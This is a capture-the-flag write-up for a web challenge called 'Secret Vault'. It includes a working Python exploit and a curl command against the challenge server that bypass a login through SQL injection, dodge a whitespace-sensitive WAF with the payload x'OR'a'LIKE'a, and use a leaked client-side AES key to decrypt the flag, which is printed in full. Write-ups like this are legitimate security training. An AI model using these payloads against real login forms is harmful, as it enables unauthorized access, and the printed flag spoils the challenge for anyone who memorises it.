---
title: "Secret Vault"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# Secret Vault

## Summary

The board triage guessed "SSRF → cloud metadata". Wrong — it is a **login form**

## Solution

### Step 1: The board triage guessed "SSRF → cloud metadata". Wrong — it is a **login form**

```python
#!/usr/bin/env python3
"""Secret Vault (WEB, 450) — SQLi login bypass + client-side AES key leak.

Chain:
  1. /login builds  SELECT ... WHERE username='<u>' AND password='<p>'  by
     string concatenation into SQLite (errors leak the shape).
  2. A naive WAF in front of it 403s the literal `' OR '` (quote-space-OR-space)
     plus union/select/--//*//||/N=N. SQLite tokenizes `'OR'` fine with no
     whitespace, so the tautology `x'OR'a'LIKE'a` walks straight past the filter:
        password='x' OR 'a' LIKE 'a'   ->   TRUE  (AND binds tighter than OR)
  3. The vault page ships the AES key for FLAG.txt in client-side JS
     (vaultKey), and offers POST /decrypt {data,key} as an oracle.
"""
import base64, json, re, sys, urllib.request, urllib.parse, http.cookiejar

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8090"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(path, body, ctype="application/x-www-form-urlencoded"):
    req = urllib.request.Request(BASE + path, data=body.encode(),
                                 headers={"Content-Type": ctype})
    return op.open(req, timeout=15).read().decode()


def get(path):
    return op.open(BASE + path, timeout=15).read().decode()


# 1. Login bypass. Whitespace-free `'OR'` dodges the WAF's `' OR '` pattern.
post("/login", urllib.parse.urlencode({"username": "admin",
                                       "password": "x'OR'a'LIKE'a"}))

# 2. Vault: encrypted FLAG.txt + the AES key the page hands to the browser.
page = get("/vault")
ct = re.search(r"decryptSecret\(\d+,\s*'([^']+)'\)", page).group(1)
key = base64.b64decode(re.search(r'vaultKey\s*=\s*"([^"]+)"',
                                 page).group(1)).decode()

# 3. Server-side decrypt oracle does the AES for us.
res = json.loads(post("/decrypt", json.dumps({"data": ct, "key": key}),
                      "application/json"))
print("[+] FLAG:", res.get("decrypted") or res)

```

### Step 2: A single quote reaches the query: `admin'` returns HTTP 200 with

A single quote reaches the query: `admin'` returns HTTP 200 with
`Database error: near "y": syntax error`, and `admin'x` leaks
`unrecognized token: "x' AND password='"` — so the query is built by concatenation:
```sql
SELECT ... WHERE username='<u>' AND password='<p>'
```
A WAF 403s "That request could not be completed" on SQLi-shaped input. Bisecting
single tokens showed it is **not** a keyword filter:




The real rule is spacing-sensitive around the operator: `a' OR(` passes but
`a' OR (` blocks, and `OR x` passes while `a' OR x` blocks. **Dropping the
whitespace defeats it**, because SQLite tokenizes `'OR'` fine when a quote sits
either side of the operator.
Because `AND` binds tighter than `OR`, the tautology reshapes the WHERE:
```
password = x'OR'a'LIKE'a
  ->  ... AND password='x' OR 'a' LIKE 'a'
  ->  (... AND password='x') OR ('a' LIKE 'a')      ->  TRUE
```
`POST /login` with `username=admin` and that password returns `302 -> /vault`.

### Step 3: `/vault` renders three cards; `FLAG.txt` is base64 ciphertext (64 bytes = 4 AES

`/vault` renders three cards; `FLAG.txt` is base64 ciphertext (64 bytes = 4 AES
blocks) and the page ships the key to the browser in plaintext JS:
```js
const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA==";   // -> b"V4ultK3y12345678"
```
It also exposes a server-side oracle `POST /decrypt {"data","key"}` (JSON).
```bash
curl -b jar -H 'Content-Type: application/json' \
  -d '{"data":"TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==","key":"V4ultK3y12345678"}' \
  http://54.72.82.22:8090/decrypt
# {"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```
The error oracle confirms AES: a 1-byte key gives
`Decryption failed: Incorrect AES key length (1 bytes)`.

## Flag

```
safctf{7877e854c9f06a8362af26ee280a6574}
```
